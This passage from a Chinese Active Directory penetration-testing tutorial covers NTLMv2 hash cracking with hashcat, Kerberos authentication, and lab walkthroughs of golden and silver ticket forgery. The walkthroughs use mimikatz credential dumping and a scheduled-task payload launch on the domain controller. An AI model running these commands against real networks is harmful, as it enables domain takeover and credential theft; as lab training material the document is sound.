class="language-none">3d00ee8a5618f85651098b8005883d5c0101000000000000f790f7af9b92d8019cba65f5e39a1ea90000000002000e0042004d002d00320030003000380001000e0042004d002d00320030003000380004000e0042004d002d00320030003000380003000e0042004d002d00320030003000380007000800f790f7af9b92d801060004000200000008003000300000000000000001000000002000009906b326309f0ba76eb46b2271795e5d12df73e87035391df48f0fad1ce073380a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340031002e003100330030000000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230130164546629.png" alt="image-20230130164546629"></p><p>7、接下来得到NTLMv2 数据，NTLMv2格式如下：</p><pre class="line-numbers language-none"><code class="language-none">username::domain:challenge:HMAC‐MD5:blob<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>介绍如下：</p><pre class="line-numbers language-none"><code class="language-none">username：对应数据包中 user namedomain:对应数据包中的 Domain nameHMAC‐MD5：对应数据包中的NTProofStrblob：数据库包中rsponse去掉HMAC‐MD5的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230130164632480.png" alt="image-20230130164632480"></p><p>8、最终的到HTLNv2如下：</p><pre class="line-numbers language-none"><code class="language-none">kkk:::53fb7eb8d40cc777:3d00ee8a5618f85651098b8005883d5c:0101000000000000f790f7af9b92d8019cba65f5e39a1ea90000000002000e0042004d002d00320030003000380001000e0042004d002d00320030003000380004000e0042004d002d00320030003000380003000e0042004d002d00320030003000380007000800f790f7af9b92d801060004000200000008003000300000000000000001000000002000009906b326309f0ba76eb46b2271795e5d12df73e87035391df48f0fad1ce073380a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340031002e003100330030000000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>9、使用hashcat 破解密码</p><pre class="line-numbers language-none"><code class="language-none">hashcat ‐m 5600kkk:::53fb7eb8d40cc777:3d00ee8a5618f85651098b8005883d5c:0101000000000000f790f7af9b92d8019cba65f5e39a1ea90000000002000e0042004d002d00320030003000380001000e0042004d002d00320030003000380004000e0042004d002d00320030003000380003000e0042004d002d00320030003000380007000800f790f7af9b92d801060004000200000008003000300000000000000001000000002000009906b326309f0ba76eb46b2271795e5d12df73e87035391df48f0fad1ce073380a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340031002e003100330030000000000000000000 1.txt ‐‐force<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的1.txt是我自己的密码字典，你们用自己的 </p><p>10、使用hashcat破解得到密码</p><p><img src="assets/image-20230130164736336.png" alt="image-20230130164736336"></p><h1 id="Windows域认证之Kerberos协议认证"><a href="#Windows域认证之Kerberos协议认证" class="headerlink" title="Windows域认证之Kerberos协议认证"></a>Windows域认证之Kerberos协议认证</h1><h2 id="什么是Kerberos协议"><a href="#什么是Kerberos协议" class="headerlink" title="什么是Kerberos协议"></a>什么是Kerberos协议</h2><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该 认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并 假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三 方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的</p><h2 id="Kerberos协议的组成角色"><a href="#Kerberos协议的组成角色" class="headerlink" title="Kerberos协议的组成角色"></a>Kerberos协议的组成角色</h2><p>在古希腊神话故事中，kerberos是一只具有三颗头颅的地狱恶犬，他守护在地狱之外，能够识别所有经此路过的亡 灵，防止活着的入侵者闯入地狱。</p><p><img src="assets/image-20230130164907797.png" alt="image-20230130164907797"></p><p>kerberos协议中也存在三个角色，分别是</p><pre class="line-numbers language-none"><code class="language-none">客户端（client）：发送请求的一方服务端（Server）：接收请求的一方密钥分发中心（Key Distribution Center，KDC），而密钥分发中心一般又分为两部分，分别是：AS（Authentication Server）：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT（票据授予票据）TGS（Ticket Granting Ticket）：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据（Ticket）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Kerberos认证的简单流程"><a href="#Kerberos认证的简单流程" class="headerlink" title="Kerberos认证的简单流程"></a>Kerberos认证的简单流程</h2><p>举个例子：</p><p> A现在想要去访问B完成一个任务。但是AB两人之间是从来没有见过面的，他们只知道对方的名字叫A，B。此时如 果A直接去找B告诉B我就是A，那么B是有理由不相信A的，B同理也得不到A的认可，他们陷入了一个无 法证明我 就是我的困境。 </p><p>于是他们就想到了一个办法，AB找到了一个他俩共同信任的人C，且这个C既认识A又认识B，所以只要C告诉B，这 个A确实就是真正的A那么B就会信任这个A，同理B经过C的认可后，A也会相信B的身份。此后，A在访问B之前会 先去找C，C会交给A一个凭证，代表此时的A已经得到了C的认证，这时A拿着凭证再去找B，便可以得到B的确认 了。 </p><p>在举个例子：</p><p> 我们去动物园，动物园不认识你不让你进，你也怕进门后不是动物园，所以就很尴尬</p><p><img src="assets/image-20230130165029831.png" alt="image-20230130165029831"></p><p>如何解决呢？我们建立一个售票窗口，只要售票处认识你和动物园，你和动物园之间就可以相互信任。</p><p><img src="assets/image-20230130165050265.png" alt="image-20230130165050265"></p><pre class="line-numbers language-none"><code class="language-none">人：代表客户端动物园：代表服务端售票处：代表KDC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>所以整个kerberos认证流程可以简化描述如下： 客户端在访问每个想要访问的网络服务时，他需要携带一个专门 用于访问该服务并且能够证明自己身份的票据，当服务端收到了该票据他才能认定客户端身份正确，向客户端提供 服务。所以整个认证流程可简化为两大步：</p><pre class="line-numbers language-none"><code class="language-none">1、客户端向KDC请求获取想要访问的目标服务的服务授予票据（Ticket）；2、客户端拿着从KDC获取的服务授予票据（Ticket）访问相应的网络服务；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230130165126649.png" alt="image-20230130165126649"></p><h2 id="Kerberos认证完成流程"><a href="#Kerberos认证完成流程" class="headerlink" title="Kerberos认证完成流程"></a>Kerberos认证完成流程</h2><p>在上述的流程中，其实还有一个问题，那就是 </p><p>1.KDC怎么知道你（客户端）就是真正的客户端？凭什么给你发放服务授予票据（Ticket）呢？</p><p>我们以去动物园为例，售票处凭什么给你买票，你如果是一个逃犯怎么办？其实买票的过程我们可以分为两步第一 才步是你拿着身份证去验证，第二步身份验证通过了才会给你票</p><p><img src="assets/image-20230130165337983.png" alt="image-20230130165337983"></p><pre class="line-numbers language-none"><code class="language-none">人：代表客户端动物园：代表服务端售票处：KDC身份校验人员:AS，负责验证用户身份的合法性，和给用户一个可以买票的票（TGT）卖票人员：TGS，负责客户端访问服务端时所需的服务授予票据的单位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以kerberos通信可以分为3步，我们逐步详解</p><h2 id="通信第一步-客户端和AS进行通信"><a href="#通信第一步-客户端和AS进行通信" class="headerlink" title="通信第一步-客户端和AS进行通信"></a>通信第一步-客户端和AS进行通信</h2><p>为了获得能够用来访问服务端服务的票据，客户端首先需要来到KDC获得服务授予票据（Ticket）。由于客户端是 第一次访问KDC，此时KDC也不确定该客户端的身份，所以第一次通信的目的为KDC认证客户端身份，确认客户端 是一个可靠且拥有访问KDC权限的客户端，</p><p><img src="assets/image-20230130165424492.png" alt="image-20230130165424492"></p><p>1、客户端用户向KDC以明文的方式发起请求。该次请求中携带了自己的用户名，主机IP，和当前时间戳； 2、KDC当中的AS（Authentication Server）接收请求（AS是KDC中专门用来认证客户端身份的认证服务器）后去 kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可 靠性； 3、如果没有该用户名，认证失败，服务结束；如果存在该用户名，则AS认证中心便认为用户存在，此时便会返回响应给 客户端，其中包含两部分内容： 3.1、第一部分内容称为TGT，他叫做票据授予票据，客户端需要使用TGT去KDC中的TGS（票据授予中心）获取访问 网络服务所需的Ticket（服务授予票据），TGT中包含的内容有kerberos数据库中存在的该客户端的Name，IP，当前时 间戳，客户端即将访问的TGS的Name，TGT的有效时间以及一把用于客户端和TGS间进行通信的Session_key(CT_SK)。 整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情 况。 3.2第二部分内容是使用客户端密钥加密的一段内容，其中包括用于客户端和TGS间通信的Session_key(CT_SK),客 户端即将访问的TGS的Name以及TGT的有效时间，和一个当前时间戳。该部分内容使用客户端密钥加密，所以客户端在拿 到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密 钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而终端认证流程。 至此，第一次通信完成。</p><h2 id="通信第二步-客户端和TGS进行通信"><a href="#通信第二步-客户端和TGS进行通信" class="headerlink" title="通信第二步-客户端和TGS进行通信"></a>通信第二步-客户端和TGS进行通信</h2><p>此时的客户端收到了来自KDC（其实是AS）的响应，并获取到了其中的两部分内容。此时客户端会用自己的密钥将 第二部分内容进行解密，分别获得时间戳，自己将要访问的TGS的信息，和用于与TGS通信时的密钥CT_SK。首先 他会根据时间戳判断该时间戳与自己发送请求时的时间之间的差值是否大于5分钟，如果大于五分钟则认为该AS是 伪造的，认证至此失败。如果时间戳合理，客户端便准备向TGS发起请求</p><p><img src="assets/image-20230130165505537.png" alt="image-20230130165505537"></p><pre class="line-numbers language-none"><code class="language-none">客户端行为：1、客户端使用CT_SK加密将自己的客户端信息发送给KDC，其中包括客户端名，IP，时间戳；2、客户端将自己想要访问的Server服务以明文的方式发送给KDC；3、客户端将使用TGS密钥加密的TGT也原封不动的也携带给KDC；TGS行为：1、此时KDC中的TGS（票据授予服务器）收到了来自客户端的请求。他首先根据客户端明文传输过来的Server服务IP查看当前kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束，。如果存在，继续接下来的认证。2、TGS使用自己的密钥将TGT中的内容进行解密，此时他看到了经过AS认证过后并记录的用户信息，一把Session_KEY即CT_SK，还有时间戳信息，他会现根据时间戳判断此次通信是否真是可靠有无超出时延。3、如果时延正常，则TGS会使用CT_SK对客户端的第一部分内容进行解密（使用CT_SK加密的客户端信息），取出其中的用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步。4、此时KDC将返回响应给客户端，响应内容包括：第一部分：用于客户端访问网络服务的使用Server密码加密的ST（Servre Ticket），其中包括客户端的Name，IP，需要访问的网络服务的地址Server IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信CS_SK（SessionKey）。第二部分：使用CT_SK加密的内容，其中包括CS_SK和时间戳，还有ST的有效时间。由于在第一次通信的过程中，AS已将CT_SK通过客户端密码加密交给了客户端，且客户端解密并缓存了CT_SK，所以该部分内容在客户端接收到时是可以自己解密的。至此，第二次通信完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="通信第三步-客户端和服务端进行通信"><a href="#通信第三步-客户端和服务端进行通信" class="headerlink" title="通信第三步-客户端和服务端进行通信"></a>通信第三步-客户端和服务端进行通信</h2><p>此时的客户端收到了来自KDC（TGS）的响应，并使用缓存在本地的CT_SK解密了第二部分内容（第一部分内容中 的ST是由Server密码加密的，客户端无法解密），检查时间戳无误后取出其中的CS_SK准备向服务端发起最后的请 求。</p><p><img src="assets/image-20230130165546042.png" alt="image-20230130165546042"></p><pre class="line-numbers language-none"><code class="language-none">客户端：1、客户端使用CS_SK将自己的主机信息和时间戳进行加密作为交给服务端的第一部分内容，然后将ST（服务授予票据）作为第二部分内容都发送给服务端。服务端：1、服务器此时收到了来自客户端的请求，他会使用自己的密钥，即Server密钥将客户端第二部分内容进行解密，核对时间戳之后将其中的CS_SK取出，使用CS_SK将客户端发来的第一部分内容进行解密，从而获得经过TGS认证过后的客户端信息，此时他将这部分信息和客户端第二部分内容带来的自己的信息进行比对，最终确认该客户端就是经过了KDC认证的具有真实身份的客户端，是他可以提供服务的客户端。此时服务端返回一段使用CT_SK加密的表示接收请求的响应给客户端，在客户端收到请求之后，使用缓存在本地的CS_ST解密之后也确定了服务端的身份（其实服务端在通信的过程中还会使用数字证书证明自己身份）。至此，第三次通信完成。此时也代表着整个kerberos认证的完成，通信的双方都确认了对方的身份，此时便可以放心的进行整个网络通信了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总体流程如下</p><p><img src="assets/image-20230130165633262.png" alt="image-20230130165633262"></p><h1 id="Golden-Ticket黄金票据制作原理及利用方式"><a href="#Golden-Ticket黄金票据制作原理及利用方式" class="headerlink" title="Golden Ticket黄金票据制作原理及利用方式"></a>Golden Ticket黄金票据制作原理及利用方式</h1><h2 id="Krbtgt账户介绍"><a href="#Krbtgt账户介绍" class="headerlink" title="Krbtgt账户介绍"></a>Krbtgt账户介绍</h2><p>krbtgt用户，是系统在创建域时自动生成的一个帐号，其作用是密钥分发中心的服务账号，其密码是系统随机生成 的，无法登录主机</p><p><img src="assets/image-20230202145132921.png" alt="image-20230202145132921"></p><h2 id="黄金票据原理"><a href="#黄金票据原理" class="headerlink" title="黄金票据原理"></a>黄金票据原理</h2><p>TGT=Krbtgt的NTLM hash 加密 </p><p>1、Kerberos中的TGT和Logon Session Key（CT_SK）是AS返回的 ，TGT它是由Krbtgt加密和签名的 ,krbtgt的 NTLM Hash又是固定的,而CT_SK并不会保存在KDC中。</p><p> 2、所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key（CT_SK）。</p><p> 3、Client与TGS的交互中，而已有了金票后（TGT）,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修 改。</p><p> 当我们获得域控的控制权限后，有可能获取域内所有用户的hash，和krbtgt的hash。这时，由于一些原因导致我 们失去对目标的控制权，但是我们还留有一个普通用户的权限，并且krbtgt的密码没有更改，此时我们可以利用 krbtgt用户的ntlm hash制作黄金票据伪造TGT，重新获取域控的管理权限。</p><p><img src="assets/image-20230202145306836.png" alt="image-20230202145306836"></p><p>我们在以去动物园为例，当我们去买票的时候，我么首先第一步是去身份认证管理员那里认证身份</p><p><img src="assets/image-20230202145323135.png" alt="image-20230202145323135"></p><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><table><thead><tr><th>实验机器</th><th>IP地址</th></tr></thead><tbody><tr><td>windows server 2012 （域控）</td><td>192.168.41.10</td></tr><tr><td>windows server 2008（域内成员）</td><td>192.168.41.20</td></tr></tbody></table><h3 id="实验前提"><a href="#实验前提" class="headerlink" title="实验前提"></a>实验前提</h3><p>1、已经控制了域名并且使用域管理员登录或者提权的system </p><p>如果域管理员发现了你控制了域控机器，把你的后门删除了，那么就不能继续控制域控了，这个时候当我们可以伪 造TGT重新获得域控的权限 </p><p>条件如下：</p><pre class="line-numbers language-none"><code class="language-none">1、域名称2、域的SID值3、域的KRBTGT账号的HASH4、伪造任意用户名（获取域的SID和KRBTGT账号的NTLM HASH的前提是需要已经拿到了域的权限）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>1、目前已经控制了域控和域内机器</p><p><img src="assets/image-20230202145547500.png" alt="image-20230202145547500"></p><p>2、获取关键信息</p><pre class="line-numbers language-none"><code class="language-none">shell whoami /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)shell net config workstation 查看域<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230202145617619.png" alt="image-20230202145617619"></p><p>得到 域为：<code>hack.com SID:S-1-5-21-2716900768-72748719-3475352185</code></p><p>3、使用mimikatz导出KRBTGT的ntlm hash</p><pre class="line-numbers language-none"><code class="language-none">mimikatz lsadump::dcsync /domain:hack.com /user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202145716694.png" alt="image-20230202145716694"></p><p>得到 <code>b78ec645cc2d18290c5690ele76e827f</code></p><p>b78ec645cc2d18290c5690e1e76e827f </p><p>lsadump::dcsync /domain:hack.com /user:krbtgt</p><p>4、这个时候突然域控下线了，管理员发现的你在控制，把后门清理了</p><p><img src="assets/image-20230202145823056.png" alt="image-20230202145823056"></p><p>5、因为之前已经记录了关键信息，我们现在就可以伪造任意用户访问域控，windows 2008机器必须是域内用户或 者system用户</p><pre class="line-numbers language-none"><code class="language-none">mimikatz kerberos::tgt 查票mimikatz kerberos::purge 清票<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230202145853051.png" alt="image-20230202145853051"></p><p>6、使用dir 远程访问域控</p><pre class="line-numbers language-none"><code class="language-none">shell dir \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202145951465.png" alt="image-20230202145951465"></p><p>7、使用计划任务上线cs</p><p>copy恶意文件到域控</p><pre class="line-numbers language-none"><code class="language-none">shell copy c:\users\administrator\desktop\artifact.exe \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202150031471.png" alt="image-20230202150031471"></p><p>设置计划任务到域控</p><pre class="line-numbers language-none"><code class="language-none">shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\artifact.exe /ru system /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202150059194.png" alt="image-20230202150059194"></p><pre class="line-numbers language-none"><code class="language-none">shell schtasks /run /s dc.hack.com /i /tn "test"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202150130353.png" alt="image-20230202150130353"></p><p>域控重新上线</p><p><img src="assets/image-20230202150148210.png" alt="image-20230202150148210"></p><h1 id="Silver-Ticket白银票据制作原理及利用方式"><a href="#Silver-Ticket白银票据制作原理及利用方式" class="headerlink" title="Silver Ticket白银票据制作原理及利用方式"></a>Silver Ticket白银票据制作原理及利用方式</h1><h2 id="服务账号介绍"><a href="#服务账号介绍" class="headerlink" title="服务账号介绍"></a>服务账号介绍</h2><p>服务账号就是计算机名字+$用来管理服务的账号</p><h2 id="白银票据原理"><a href="#白银票据原理" class="headerlink" title="白银票据原理"></a>白银票据原理</h2><p>如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST。 在Kerberos认证的第三部，Client带着ST和 Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST, 从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问 server上的指定服务了。所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的 门票只对部分服务起作用。</p><p><img src="assets/image-20230202172747936.png" alt="image-20230202172747936"></p><p>我们以去动物举例</p><p><img src="assets/image-20230202172809787.png" alt="image-20230202172809787"></p><h2 id="实验内容-1"><a href="#实验内容-1" class="headerlink" title="实验内容"></a>实验内容</h2><h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><table><thead><tr><th>实验机器</th><th>IP地址</th></tr></thead><tbody><tr><td>windows server 2012 （域控）</td><td>192.168.41.10</td></tr><tr><td>windows server 2008（域内成员）</td><td>192.168.41.20</td></tr><tr><td>windows server 2003（域内成员）</td><td>192.168.41.30</td></tr></tbody></table><h3 id="实验前提-1"><a href="#实验前提-1" class="headerlink" title="实验前提"></a>实验前提</h3><p>1、已经控制了域控并且使用域管理员登录或者提权的system </p><p>我们的目的是去访问windows server 2003 的机器 </p><p>条件如下：</p><pre class="line-numbers language-none"><code class="language-none">1.域名2.域sid3.目标服务器名4.可利用的服务5.服务账号的NTML HASH6.需要伪造的用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="控制域控"><a href="#控制域控" class="headerlink" title="控制域控"></a>控制域控</h4><h5 id="1、获取基本信息"><a href="#1、获取基本信息" class="headerlink" title="1、获取基本信息"></a>1、获取基本信息</h5><pre class="line-numbers language-none"><code class="language-none">shell whoami /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)shell net config workstation 查看域<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230202173041308.png" alt="image-20230202173041308"></p><p>得到 域为：<code>hack.com SID:S-1-5-21-2716900768-72748719-3475352185</code></p><h5 id="2、获取服务账号的ntlm-hash值"><a href="#2、获取服务账号的ntlm-hash值" class="headerlink" title="2、获取服务账号的ntlm hash值"></a>2、获取服务账号的ntlm hash值</h5><pre class="line-numbers language-none"><code class="language-none">mimikatz sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202173120289.png" alt="image-20230202173120289"></p><p>得到 hash <code>26a703eba507e848825615316bc880a1</code></p><h5 id="3、伪造票据（CIFS共享服务）"><a href="#3、伪造票据（CIFS共享服务）" class="headerlink" title="3、伪造票据（CIFS共享服务）"></a>3、伪造票据（CIFS共享服务）</h5><pre class="line-numbers language-none"><code class="language-none">mimikatz kerberos::tgt 查票mimikatz kerberos::purge 清票shell klist 查票shell klist purge 清票mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72748719‐3475352185 /target:dc.hack.com /service:cifs /rc4:26a703eba507e848825615316bc880a1 /user:abcd /ptt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230202173232588.png" alt="image-20230202173232588"></p><h5 id="4、访问域控"><a href="#4、访问域控" class="headerlink" title="4、访问域控"></a>4、访问域控</h5><pre class="line-numbers language-none"><code class="language-none">shell dir \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202173258435.png" alt="image-20230202173258435"></p><h5 id="5、伪造票据（LDAP共享服务）"><a href="#5、伪造票据（LDAP共享服务）" class="headerlink" title="5、伪造票据（LDAP共享服务）"></a>5、伪造票据（LDAP共享服务）</h5><pre class="line-numbers language-none"><code class="language-none">mimikatz kerberos::tgt 查票mimikatz kerberos::purge 清票shell klist 查票shell klist purge 清票mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72748719‐3475352185/target:dc.hack.com /service:LDAP /rc4:26a703eba507e848825615316bc880a1 /user:abcd /ptt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="6、查询域控的krgtgt"><a href="#6、查询域控的krgtgt" class="headerlink" title="6、查询域控的krgtgt"></a>6、查询域控的krgtgt</h5><pre class="line-numbers language-none"><code class="language-none">mimikatz lsadump::dcsync /dc:dc.hack.com /domain:hack.com /user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202173353714.png" alt="image-20230202173353714"></p><h5 id="7、再使用一次黄金票据使域控上线"><a href="#7、再使用一次黄金票据使域控上线" class="headerlink" title="7、再使用一次黄金票据使域控上线"></a>7、再使用一次黄金票据使域控上线</h5><pre class="line-numbers language-none"><code class="language-none">krbtgt的ntml hash域控管理员的sid域名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="控制2003"><a href="#控制2003" class="headerlink" title="控制2003"></a>控制2003</h4><h5 id="1、获取基本信息-1"><a href="#1、获取基本信息-1" class="headerlink" title="1、获取基本信息"></a>1、获取基本信息</h5><pre class="line-numbers language-none"><code class="language-none">shell whoami /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)shell net config workstation 查看域<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230202173434780.png" alt="image-20230202173434780"></p><p>得到 域为：<code>hack.com SID:S-1-5-21-2716900768-72748719-3475352185</code></p><h5 id="2、获取服务账号的ntlm-hash值-1"><a href="#2、获取服务账号的ntlm-hash值-1" class="headerlink" title="2、获取服务账号的ntlm hash值"></a>2、获取服务账号的ntlm hash值</h5><pre class="line-numbers language-none"><code class="language-none">mimikatz sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202173505598.png" alt="image-20230202173505598"></p><p>得到 hash <code>1a4c65ba0926944b4066f6fcdcf05bbd</code></p><h5 id="3、伪造票据（CIFS共享服务）-1"><a href="#3、伪造票据（CIFS共享服务）-1" class="headerlink" title="3、伪造票据（CIFS共享服务）"></a>3、伪造票据（CIFS共享服务）</h5><pre class="line-numbers language-none"><code class="language-none">mimikatz kerberos::tgt 查票mimikatz kerberos::purge 清票shell klist 查票shell klist purge 清票mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72748719‐3475352185 /target:PC‐2003.hack.com /service:cifs /rc4:1a4c65ba0926944b4066f6fcdcf05bbd /user:abc /ptt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230202173541989.png" alt="image-20230202173541989"></p><h5 id="4、访问2003"><a href="#4、访问2003" class="headerlink" title="4、访问2003"></a>4、访问2003</h5><pre class="line-numbers language-none"><code class="language-none">shell dir \\pc‐2003.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202173610732.png" alt="image-20230202173610732"></p><h1 id="Mimikatz介绍和离线读取SAM文件抓取密码"><a href="#Mimikatz介绍和离线读取SAM文件抓取密码" class="headerlink" title="Mimikatz介绍和离线读取SAM文件抓取密码"></a>Mimikatz介绍和离线读取SAM文件抓取密码</h1><h2 id="Mimikatz介绍"><a href="#Mimikatz介绍" class="headerlink" title="Mimikatz介绍"></a>Mimikatz介绍</h2><p>Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，但由于其功能强大，能够直接读取 WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具，mimikatz可以从内存中提 取明文密码、哈希、PIN 码和 kerberos 票证。 mimikatz 还可以执行哈希传递、票证传递或构建黄金票证</p><p>项目地址 <a href="https://github.com/gentilkiwi/mimikatz/">https://github.com/gentilkiwi/mimikatz/</a></p><h3 id="模块命令如下："><a href="#模块命令如下：" class="headerlink" title="模块命令如下："></a>模块命令如下：</h3><pre class="line-numbers language-none"><code class="language-none">cls： 清屏standard： 标准模块，基本命令crypto： 加密相关模块sekurlsa： 与证书相关的模块kerberos： kerberos模块privilege： 提权相关模块process： 进程相关模块serivce： 服务相关模块lsadump： LsaDump模块ts： 终端服务器模块event： 事件模块misc： 杂项模块token： 令牌操作模块vault： Windows 、证书模块minesweeper：Mine Sweeper模块net：dpapi： DPAPI模块（通过API或RAW访问）[数据保护应用程序编程接口]busylight： BusyLight Modulesysenv： 系统环境值模块sid： 安全标识符模块iis： IIS XML配置模块rpc： mimikatz的RPC控制sr98： 用于SR98设备和T5577目标的RF模块rdm： RDM（830AL）器件的射频模块acr： ACR模块version： 查看版本exit： 退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><pre class="line-numbers language-none"><code class="language-none">CRYPTO::Certificates – 列出/导出凭证。KERBEROS::Golden – 创建黄金票证/白银票证/信任票证。KERBEROS::List – 列出在用户的内存中所有用户的票证（TGT 和 TGS）。KERBEROS::PTT – 票证传递。LSADUMP::DCSync – 向 DC 发起同步一个对象（获取帐户的密码数据）的质询。LSADUMP::LSA – 向 LSA Server 质询检索 SAM/AD 的数据（正常或未打补丁的情况下）。可以从 DC 或者是一个lsass.dmp的转储文件中导出所有的Active Directory 域凭证数据。同样也可以获取指定帐户的凭证，如 krbtgt 帐户，使用 /name 参数，如：“/name:krbtgt”。LSADUMP::SAM ‐ 获取 SysKey 来解密 SAM 的项目数据（从注册表或者 hive 中导出）SAM 选项。可以连接到本地安全帐户管理器（SAM）数据库中并能转储本地帐户的凭证。可以用来转储在 Windows 计算机上的所有的本地凭据。LSADUMP::Trust ‐ 向 LSA Server 质询来获取信任的认证信息（正常或未打补丁的情况下）为所有相关的受信的域或林转储信任密钥（密码）MISC::AddSid – 将用户帐户添加到 SID 历史记录。第一个值是目标帐户，第二值是帐户/组名（可以是多个或 SID）。MISC::MemSSP – 注入恶意的 Wndows SSP 来记录本地身份验证凭据。MISC::Skeleton – 在 DC 中注入万能钥匙（Skeleton Key） 到 LSASS 进程中。这使得所有用户所。使用的万能钥匙修补 DC 使用 “主密码” 